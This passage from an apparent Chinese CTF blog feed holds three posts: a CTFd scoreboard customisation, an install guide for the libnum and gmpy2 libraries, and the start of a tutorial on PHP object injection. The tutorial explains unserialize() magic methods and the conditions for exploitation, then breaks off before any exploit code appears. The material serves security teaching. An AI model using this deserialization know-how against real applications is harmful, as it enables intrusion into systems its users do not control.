class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># auto-broadcast</span><br><span class="hljs-keyword">if</span> app.config[<span class="hljs-string">&#x27;AUTO_BROADCAST&#x27;</span>]:<br>solve_count = Solves.query.filter_by(challenge_id=challenge_id).count()<br>blood_number = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> solve_count == <span class="hljs-number">1</span>:<br>blood_number = <span class="hljs-string">&quot;first&quot;</span><br> <span class="hljs-keyword">elif</span> solve_count == <span class="hljs-number">2</span>:<br>  blood_number = <span class="hljs-string">&quot;second&quot;</span><br> <span class="hljs-keyword">elif</span> solve_count == <span class="hljs-number">3</span>:<br> blood_number = <span class="hljs-string">&quot;third&quot;</span><br> <span class="hljs-keyword">else</span>:<br> <span class="hljs-keyword">pass</span><br> <span class="hljs-keyword">if</span> blood_number:<br> broad = &#123;<br> <span class="hljs-string">&#x27;title&#x27;</span>:<span class="hljs-string">&quot;Congratulations!&quot;</span>,<br> <span class="hljs-string">&#x27;content&#x27;</span>:<span class="hljs-string">&quot;User [&#123;0&#125;] got the &#123;1&#125; blood of [&#123;2&#125;]&quot;</span>.<span class="hljs-built_in">format</span>(user_name, blood_number, challenge_name)<br> &#125;<br>        schema = NotificationSchema()<br> broad_result = schema.load(broad)<br><br> db.session.add(broad_result.data)<br> db.session.commit()<br><br> <span class="hljs-comment"># Grab additional settings</span><br> broad[<span class="hljs-string">&quot;type&quot;</span>] = <span class="hljs-string">&quot;toast&quot;</span><br> broad[<span class="hljs-string">&quot;sound&quot;</span>] = <span class="hljs-literal">False</span><br> broad[<span class="hljs-string">&quot;blood&quot;</span>] = blood_number<br><br> app.events_manager.publish(data=broad, <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;notification&quot;</span>)<br>                <br> <span class="hljs-keyword">return</span> &#123;<br> <span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">True</span>,<br> <span class="hljs-string">&quot;data&quot;</span>: &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;correct&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: message&#125;,<br> &#125;<br></code></pre></td></tr></table></figure><p>然后在 <code>/CTFd/config.py</code> 里增加 <code>AUTO_BROADCAST = True</code></p><h3 id="提示音修改"><a href="#提示音修改" class="headerlink" title="提示音修改"></a>提示音修改</h3><p>将准备的三杀的音效放进 <code>/CTFd/CTFd/themes/core/static/sounds</code>，然后在 <code>/CTFd/CTFd/themes/core/static/js/events.js</code> 修改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> howl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br>    <span class="hljs-attr">src</span>: [<br>      root + <span class="hljs-string">&quot;/themes/core/static/sounds/notification.webm&quot;</span>,<br>      root + <span class="hljs-string">&quot;/themes/core/static/sounds/notification.mp3&quot;</span><br>    ]<br>  &#125;);<br><span class="hljs-keyword">const</span> howl_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br>            root + <span class="hljs-string">&quot;/themes/core/static/sounds/first.webm&quot;</span>,<br>            root + <span class="hljs-string">&quot;/themes/core/static/sounds/first.mp3&quot;</span><br> ]<br> &#125;);<br> <span class="hljs-keyword">const</span> howl_s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/second.webm&quot;</span>,<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/second.mp3&quot;</span><br> ]<br> &#125;);<br><span class="hljs-keyword">const</span> howl_t = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Howl</span>(&#123;<br> <span class="hljs-attr">src</span>: [<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/third.webm&quot;</span>,<br> root + <span class="hljs-string">&quot;/themes/core/static/sounds/third.mp3&quot;</span><br> ]<br> &#125;);<br></code></pre></td></tr></table></figure><p>然后添加:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">switch</span> (data.<span class="hljs-property">blood</span>) &#123;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;first&quot;</span>:<br> howl_f.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;second&quot;</span>:<br> howl_s.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;third&quot;</span>:<br> howl_t.<span class="hljs-title function_">play</span>(); <span class="hljs-keyword">break</span>;<br> <span class="hljs-attr">default</span>: <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnt8x.png" alt="8tnt8x.png"></p><p>然后全局搜索，将带有 <code>notification.webm</code> 的所有 <code>min.js</code> 全部按照这个格式修改（大概20+个文件），还要注意混淆：<code>root -&gt; e</code> ，<code>data.blood -&gt; e.blood </code>。</p><h1 id="题目solves显示"><a href="#题目solves显示" class="headerlink" title="题目solves显示"></a>题目solves显示</h1><p>将solves的用户筛选只显示前三，并且增加小图标：</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnN26.png" alt="8tnN26.png"></p><p>增加一个列，在 <code>/themes/core/static/js/pages/challenges.min.js</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tndKO.png" alt="8tndKO.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; <span class="hljs-number">3</span>; n++) &#123;<br> <span class="hljs-keyword">var</span> s = t[n].<span class="hljs-property">account_id</span>,<br> a = t[n].<span class="hljs-property">name</span>,<br> i = (<span class="hljs-number">0</span>, d.<span class="hljs-property">default</span>)(t[n].<span class="hljs-property">date</span>).<span class="hljs-title function_">local</span>().<span class="hljs-title function_">fromNow</span>(),<br> l = t[n].<span class="hljs-property">account_url</span>;<br> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>)&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/1.png&quot; width=&quot;33&quot; height=&quot;33&quot;&gt;&#x27;</span>;<br> &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/2.png&quot; width=&quot;27&quot; height=&quot;27&quot;&gt;&#x27;</span>;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> rk = <span class="hljs-string">&#x27;&lt;img src=&quot;themes/core/static/img/3.png&quot; width=&quot;15&quot; height=&quot;15&quot;&gt;&#x27;</span>;<br> &#125;<br> o.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td&gt;&#123;4&#125;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;&#123;0&#125;&quot;&gt;&#123;2&#125;&lt;/td&gt;&lt;td&gt;&#123;3&#125;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>.<span class="hljs-title function_">format</span>(l, s, (<span class="hljs-number">0</span>, r.<span class="hljs-property">htmlEntities</span>)(a), i, rk))<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学libnum和gmpy2模块的安装</title>
    <link href="/2020/02/28/libnum_gmpy2/"/>
    <url>/2020/02/28/libnum_gmpy2/</url>
    
    <content type="html"><![CDATA[<p>终于有空来整理一下安装教程，顺便给新人留点参考资料，避免踩坑。</p><h1 id="libnum"><a href="#libnum" class="headerlink" title="libnum"></a>libnum</h1><p>libnum库是一个关于各种数学运算的函数库，它包含common maths、modular、modular squre roots、primes、factorization、ECC、converting、stuff等方面的函数，结合<a href="#gmpy2">gmpy2库</a>、<a href="#">PyCrypto库</a>一起来使用会使计算变得非常简便。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/hellman/libnum<br><span class="hljs-built_in">cd</span> libnum<br>python setup.py install<br></code></pre></td></tr></table></figure><h2 id="常用的Converting"><a href="#常用的Converting" class="headerlink" title="常用的Converting"></a>常用的Converting</h2><p>数字型（不论是十六进制还是十进制）与字符串之间的转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&quot;flag&#123;52Hertz_is_caiji&#125;&quot;</span><br><span class="hljs-built_in">print</span>(libnum.s2n(s))<br><span class="hljs-comment"># 38321129010630712848744725072051706353616984535099773</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>n=<span class="hljs-number">0x666c61677b3532486572747a5f69735f6361696a697d</span><br><span class="hljs-built_in">print</span> libnum.n2s(n)<br><span class="hljs-comment">#这个转换不用在意十六进制的位数是否为偶数</span><br></code></pre></td></tr></table></figure><p>二进制与字符串之间的转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>s=<span class="hljs-string">&#x27;52Hertz&#x27;</span><br><span class="hljs-built_in">print</span>(libnum.s2b(s))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>b=<span class="hljs-string">&#x27;00110101001100100100100001100101011100100111010001111010&#x27;</span><br><span class="hljs-built_in">print</span> libnum.b2s(b)<br><span class="hljs-comment">#二进制的位数最好是8的倍数</span><br></code></pre></td></tr></table></figure><h2 id="质数-amp-因数分解"><a href="#质数-amp-因数分解" class="headerlink" title="质数&amp;因数分解"></a>质数&amp;因数分解</h2><p>生成质数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(libnum.generate_prime(<span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><p>因数分解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(libnum.factorize(<span class="hljs-number">1024</span>))<br></code></pre></td></tr></table></figure><h1 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h1><p>GMP（GNU Multiple Precision Arithmetic Library，即GNU高精度算术运算库），它是一个开源的高精度运算库，其中不但有普通的整数、实数、浮点数的高精度运算，还有随机数生成，尤其是提供了非常完备的数论中的运算接口，比如Miller-Rabin素数测试算法、大素数生成、欧几里德算法、求域中元素的逆、Jacobi符号、legendre符号等。<br>gmpy2是Python的一个扩展库，是对GMP的封装，它的前身是gmpy，经过其作者的调整和封装，使得gmpy2的使用大大简化。</p><h2 id="Windows上安装"><a href="#Windows上安装" class="headerlink" title="Windows上安装"></a>Windows上安装</h2><p>在windows上直接安装wheel文件就方便多了。</p><p><a href="https://pypi.org/project/gmpy2/#files">https://pypi.org/project/gmpy2/#files</a></p><p>这里面有python2.6、2.7、3.2、3.3、3.4版本的wheel文件，下载后用pip安装即可。</p><p>如果有高版本的可以参考 <a href="https://github.com/aleaxit/gmpy/releases/tag/gmpy2-2.1.0a1">Github项目</a>，或者 <a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy">Here</a></p><h3 id="wheel"><a href="#wheel" class="headerlink" title="wheel"></a>wheel</h3><p>先检查一下是否安装了wheel文件包，在cmd中输入wheel，查看一下，如果没有安装，则输入安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install wheel<br></code></pre></td></tr></table></figure><h3 id="下载对应whl文件"><a href="#下载对应whl文件" class="headerlink" title="下载对应whl文件"></a>下载对应whl文件</h3><p>以我自己的环境为例，我下载的是 <a href="javascript:;">gmpy2‑2.0.8‑cp37‑cp37m‑win32.whl</a></p><p>whl文件包需要和你所安装的python3版本一致，建议这个文件下载后放到python文件目录下。</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>打开cmd，输入 <code>pip install [whl文件的绝对路径]</code> 安装whl文件包</p><p>以我为例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install C:\Users\mcwin\AppData\Local\Programs\Python\Python37-32\gmpy2-2.0.8-cp37-cp37m -win32.whl<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>然后输入 <code>import gmpy2</code> 即可进行使用</p><h2 id="Linux上安装"><a href="#Linux上安装" class="headerlink" title="Linux上安装"></a>Linux上安装</h2><p>gmpy2是依赖GMP、MPFR、MPC三个库，故此在linux上安装前得先安装这3个库。</p><p>为了后续安装的方便，先建立2个文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/src<br><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/static<br></code></pre></td></tr></table></figure><p>测试有没有安装m4模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">man m4<br></code></pre></td></tr></table></figure><p>如果出现No manual entry for m4，就说明没有安装m4模块。</p><p>如果没安装m4模块，在编译GMP时候会报错<code>checking for suitable m4... configure: error: No usable m4 in $PATH or /usr/5bin (see config.log for reasons)</code>.</p><h3 id="安装m4"><a href="#安装m4" class="headerlink" title="安装m4"></a>安装m4</h3><p>GNU M4 is an implementation of the traditional Unix macro processor. It is mostly SVR4 compatible although it has some extensions (for example, handling more than 9 positional parameters to macros). GNU M4 also has built-in functions for including files, running shell commands, doing arithmetic, etc.</p><p>1.4.18 版本为例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=1.4.18<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget http://ftp.gnu.org/gnu/m4/m4-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar xf m4-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> m4-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure -prefix=/usr/local<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="安装GMP"><a href="#安装GMP" class="headerlink" title="安装GMP"></a>安装GMP</h3><p>GMP(The GNU Multiple Precision Arithmetic Library) is a free library for arbitrary precision arithmetic, operating on signed integers, rational numbers, and floating-point numbers.<br><a href="https://gmplib.org/">https://gmplib.org/</a></p><p>6.1.2 版本为例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=6.1.2<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget https://gmplib.org/download/gmp/gmp-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br>tar -jxvf gmp-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2 &amp;&amp; <span class="hljs-built_in">cd</span> gmp-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="安装MPFR"><a href="#安装MPFR" class="headerlink" title="安装MPFR"></a>安装MPFR</h3><p>The MPFR library is a C library for multiple-precision floating-point computations with correct rounding.<br><a href="http://www.mpfr.org/mpfr-current/#download">http://www.mpfr.org/mpfr-current/#download</a><br>4.0.1 为例 （请自己访问官网，替换成最新的版本号）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=4.0.1<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget http://www.mpfr.org/mpfr-current/mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br>tar -jxvf mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2 &amp;&amp; <span class="hljs-built_in">cd</span> mpfr-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic --with-gmp=<span class="hljs-variable">$HOME</span>/static<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>如果mpfr.org下载太慢，可以换为</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget http://ftp.gnu.org/gnu/mpfr/mpfr-<span class="hljs-variable">$&#123;v&#125;</span>.tar.bz2<br></code></pre></td></tr></table></figure><h3 id="安装MPC"><a href="#安装MPC" class="headerlink" title="安装MPC"></a>安装MPC</h3><p>GNU MPC is a C library for the arithmetic of complex numbers with arbitrarily high precision and correct rounding of the result.<br><a href="http://www.multiprecision.org/mpc/download.html">http://www.multiprecision.org/mpc/download.html</a> （这里最新是1.0.3）<br>但当mpfr版本为4.x以上会报错Makefile:532: recipe for target ‘mul.lo’ failed</p><p>在<a href="ftp://ftp.gnu.org/gnu/mpc/">ftp://ftp.gnu.org/gnu/mpc/ </a>可以找到更新的1.1.0版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=1.1.0<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget ftp://ftp.gnu.org/gnu/mpc/mpc-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar -zxvf mpc-<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> mpc-<span class="hljs-variable">$&#123;v&#125;</span><br>./configure --prefix=<span class="hljs-variable">$HOME</span>/static --enable-static --disable-shared --with-pic --with-gmp=<span class="hljs-variable">$HOME</span>/static --with-mpfr=<span class="hljs-variable">$HOME</span>/static<br>make &amp;&amp; make check &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="安装gmpy2"><a href="#安装gmpy2" class="headerlink" title="安装gmpy2"></a>安装gmpy2</h3><p>github项目：<a href="https://github.com/aleaxit/gmpy">https://github.com/aleaxit/gmpy</a></p><p>现在新的版本（2-2.1.0b1以上版本）在执行python setup.py build_ext –static&#x3D;$HOME&#x2F;static install</p><p>会报错error: option –static must not have an argument</p><p>解决法子1：</p><p>找<a href="https://github.com/aleaxit/gmpy/releases/">releases版本</a>（2-2.1.0a1以下版本）来安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">v=2-2.1.0a1<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/src<br>wget https://github.com/aleaxit/gmpy/releases/download/gmpy<span class="hljs-variable">$&#123;v&#125;</span>/gmpy<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz<br>tar xf gmpy<span class="hljs-variable">$&#123;v&#125;</span>.tar.gz &amp;&amp; <span class="hljs-built_in">cd</span> gmpy<span class="hljs-variable">$&#123;v&#125;</span><br>python setup.py build_ext --static=<span class="hljs-variable">$HOME</span>/static install<br></code></pre></td></tr></table></figure><p>解决法子2：</p><p>因为新版本的setup.py修改了不少，故得采用以下法子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">python setup.py build_ext --static-dir=<span class="hljs-variable">$HOME</span>/static install<br></code></pre></td></tr></table></figure><p>安装后，命令行进入python模式后，输入import gmpy2没报错就成功了。</p><p>如果使用wget下载时候一直卡在：</p><p><code>Connecting to github-production-release-asset-2e65be.s3.amazonaws.com (github-production-release-asset-2e65be.s3.amazonaws.com)|52.216.227.24|:443...</code></p><p>可以尝试：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 52.216.16.16 github-production-release-asset-2e65be.s3.amazonaws.com &gt;&gt;/etc/hosts<br>/etc/init.d/networking restart<br></code></pre></td></tr></table></figure><p>如果报错fatal error: Python.h: 没有那个文件或目录</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install python-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p><code>import gmpy2</code></p><p>具体使用姿势可以百度或者Google，看官方文档当然是最好的。</p><p>参考：</p><p><a href="https://www.cnblogs.com/pcat/">pcat</a></p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP Object Injection(对象注入)</title>
    <link href="/2020/02/26/PHP_Object_Injection/"/>
    <url>/2020/02/26/PHP_Object_Injection/</url>
    
    <content type="html"><![CDATA[<p>PHP对象注入是一个应用程序级别的漏洞，根据上下文，该漏洞可能允许攻击者执行不同种类的恶意攻击，例如代码注入，SQL注入，路径遍历和应用程序拒绝服务。 如果在将用户提供的输入传递给PHP函数<code>unserialize()</code>之前，未对用户提供的输入进行正确的检验，则会发生此漏洞。 由于PHP允许对象序列化，因此攻击者可以将临时序列化的字符串传递给易受攻击的<code>unserialize()</code>调用，从而将任意PHP对象注入应用程序范围。</p><h1 id="PHP常用魔术方法"><a href="#PHP常用魔术方法" class="headerlink" title="PHP常用魔术方法"></a>PHP常用魔术方法</h1><ul><li><code>__construct()</code> : 具有构造函数的类会在每次创建新对象时(实例化)先调用此方法，初始化工作执行。</li><li><code>__destruct()</code> : 析构函数，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li><li><code>__sleep()</code> : <code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被反序列化的变量名称的数组。</li><li><code>__wakeup()</code> : 与<code>__sleep()</code> 相反，<code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code>，预先准备对象需要的资源。作用例如：重新建立数据库连接，或执行其它初始化操作。</li><li><code>__toString()</code> : 用于一个类被当成字符串时应该怎么回应，例如 <code>echo $obj;</code> 时应该显示什么。</li><li><code>__get()</code>  : 获得一个类的成员变量时调用。</li><li><code>__set()</code> : 设置一个类的成员变量时调用。</li><li><code>__invoke()</code> : 调用函数的方式调用一个对象时的回应方法。</li><li><code>__call()</code> : 在对象中调用一个不可访问的方法时，<code>__call()</code> 会被调用。</li><li><code>__callStatic()</code> : 在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</li></ul><p><code>__call()</code> 和 <code>__callStatic()</code> 是对方法的重载，参数为<code>($name, $arguments)</code>，<code>$name</code>参数是要调用的方法名称，<code>$arguments</code>参数是一个枚举数组，包含着要传递给方法 <code>$name</code> 的参数。</p><p>详细见<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">文档</a></p><p>当然也可以看我的另一篇有关 <code>Wrapper Phar://</code> 的<a href="">博客</a></p><p>为了成功利用PHP对象注入漏洞，必须满足两个条件：</p><ul><li>该应用程序必须具有一个实现PHP魔术方法的类（例如<code>__wakeup</code>或<code>__destruct</code>），该方法可用于进行恶意攻击或启动“ POP链”。</li><li>在攻击中使用的所有类都必须在调用易受攻击的<code>unserialize()</code>时声明，否则此类类必须支持对象自动加载。</li></ul><p>反序列化格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;i:<span class="hljs-number">20</span>;&#125;<br>对象类型:长度:<span class="hljs-string">&quot;名字&quot;</span>:类中变量的个数:&#123;类型:长度:<span class="hljs-string">&quot;名字&quot;</span>;类型:长度:<span class="hljs-string">&quot;值&quot;</span>;......&#125;<br></code></pre></td></tr></table></figure><p>类型字母：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tsx">a - array                  b - <span class="hljs-built_in">boolean</span>  <br>d - double                 i - integer<br>o - common <span class="hljs-built_in">object</span>          r - reference<br>s - <span class="hljs-built_in">string</span>                 C - custom <span class="hljs-built_in">object</span><br>O - <span class="hljs-keyword">class</span>                  <span class="hljs-title class_">N</span> - <span class="hljs-literal">null</span><br>R - pointer reference      U - unicode <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>当变量为 <code>private</code> ，<code>protected</code>时，变量会多两个字节，这是因为对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上<code>*</code>。这些前缀值在任一侧都有空字节。</p><h1 id="wakeup-in-the-unserialize-function"><a href="#wakeup-in-the-unserialize-function" class="headerlink" title="__wakeup() in the unserialize function"></a>__wakeup() in the unserialize function</h1><blockquote><p><strong>unserialize()</strong> takes a single serialized variable and converts it back into a PHP value.</p><p>If the variable being unserialized is an object, after successfully reconstructing the object PHP will automatically attempt to call the <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup">__wakeup()</a> member function (if it exists).</p></blockquote><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 